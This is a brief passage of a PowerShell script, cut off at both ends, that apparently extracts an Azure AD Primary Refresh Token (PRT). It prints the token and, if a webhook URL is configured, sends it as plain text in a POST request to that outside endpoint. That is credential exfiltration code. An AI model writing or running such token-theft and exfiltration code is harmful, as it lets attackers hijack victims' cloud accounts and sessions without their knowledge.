...
"@
			...
			# Write PRT Token to console
			Write-Host $prtToken

            # ✅ Send PRT token as plain text only if ON
            if ($WebhookUrl) {
				Invoke-RestMethod -Uri $WebhookUrl -Method POST -Body $formattedToken -ContentType "text/plain"
			}
        }
        catch {
